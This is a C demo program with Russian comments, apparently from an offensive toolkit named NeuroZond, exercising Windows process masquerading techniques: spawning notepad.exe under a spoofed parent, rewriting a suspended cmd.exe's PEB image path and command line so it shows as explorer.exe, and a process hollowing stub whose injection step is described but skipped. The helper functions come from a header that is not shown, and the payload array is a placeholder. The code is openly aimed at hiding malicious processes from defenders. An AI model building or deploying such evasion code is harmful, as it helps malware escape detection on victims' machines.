/**
 * Process Masquerading Demo - NeuroZond
 * 
 * Пример использования техник маскировки процессов:
 * - PPID Spoofing - создание процесса с подмененным родителем
 * - Process Hollowing - замена содержимого легитимного процесса
 * - PEB модификация - изменение идентификатора процесса
 */

#include "../core/process_masquerading.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// Пример полезной нагрузки (для демонстрации)
unsigned char demoPayload[] = {
    // Здесь должен быть скомпилированный PE-файл, заменен на простой код
    // который выводит сообщение "Hello from hollowed process"
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
    // ... остальные байты исполняемого файла
};

void DemonstratePPIDSpoofing() {
    printf("[+] Демонстрация PPID Spoofing\n");
    printf("[*] Создание процесса notepad.exe с родителем explorer.exe\n");

    PROCESS_INFORMATION pi = {0};
    if (SpawnProcessWithSpoofedParent(
            L"C:\\Windows\\System32\\notepad.exe",
            L"explorer.exe",
            L"notepad.exe",
            &pi)) {
        printf("[+] Успешно создан процесс с PID: %d\n", pi.dwProcessId);
        printf("[*] Проверьте родительский процесс в диспетчере задач или Process Explorer\n");
        
        // Для демонстрации просто ждем несколько секунд перед завершением
        Sleep(5000);
        
        // Завершаем процесс
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] Не удалось создать процесс с подмененным родителем: %d\n", GetLastError());
    }
}

void DemonstrateProcessIdentityModification() {
    printf("\n[+] Демонстрация модификации идентификатора процесса (PEB)\n");
    
    // Создаем обычный процесс cmd.exe в приостановленном состоянии
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (!CreateProcessW(
            L"C:\\Windows\\System32\\cmd.exe",
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi)) {
        printf("[-] Не удалось создать процесс: %d\n", GetLastError());
        return;
    }
    
    printf("[*] Создан процесс cmd.exe с PID: %d\n", pi.dwProcessId);
    
    // Модифицируем PEB, чтобы процесс выглядел как explorer.exe
    if (ModifyProcessIdentity(pi.hProcess, L"C:\\Windows\\explorer.exe")) {
        printf("[+] Успешно изменен путь к образу процесса\n");
    } else {
        printf("[-] Не удалось изменить путь к образу: %d\n", GetLastError());
    }
    
    // Модифицируем командную строку
    if (ModifyCommandLine(pi.hProcess, L"explorer.exe")) {
        printf("[+] Успешно изменена командная строка процесса\n");
    } else {
        printf("[-] Не удалось изменить командную строку: %d\n", GetLastError());
    }
    
    // Возобновляем процесс
    ResumeThread(pi.hThread);
    
    printf("[*] Процесс запущен. Проверьте его имя и командную строку в Process Explorer\n");
    printf("[*] Process Explorer должен показывать explorer.exe вместо cmd.exe\n");
    
    // Для демонстрации ждем несколько секунд перед завершением
    Sleep(5000);
    
    // Завершаем процесс
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void DemonstrateProcessHollowing() {
    printf("\n[+] Демонстрация Process Hollowing\n");
    printf("[*] В реальном сценарии здесь была бы загрузка вредоносного PE-файла\n");
    printf("[*] Для демонстрации мы просто покажем технику без реального внедрения\n");
    
    // Создаем обычный процесс notepad.exe в приостановленном состоянии
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (!CreateProcessW(
            L"C:\\Windows\\System32\\notepad.exe",
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi)) {
        printf("[-] Не удалось создать процесс: %d\n", GetLastError());
        return;
    }
    
    printf("[*] Создан процесс notepad.exe с PID: %d в приостановленном состоянии\n", pi.dwProcessId);
    printf("[*] В полной реализации здесь произошло бы внедрение вредоносного кода\n");
    printf("[*] через HollowProcess(pi, payloadData, payloadSize)\n");
    
    // В демонстрационных целях просто возобновляем процесс без внедрения
    ResumeThread(pi.hThread);
    
    printf("[*] Процесс запущен в нормальном режиме\n");
    
    // Для демонстрации ждем несколько секунд перед завершением
    Sleep(5000);
    
    // Завершаем процесс
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main() {
    printf("======== NeuroZond Process Masquerading Demo ========\n\n");
    
    // Демонстрация подмены родительского процесса
    DemonstratePPIDSpoofing();
    
    // Демонстрация модификации идентификатора процесса
    DemonstrateProcessIdentityModification();
    
    // Демонстрация Process Hollowing
    DemonstrateProcessHollowing();
    
    printf("\n======== Демонстрация завершена ========\n");
    return 0;
} 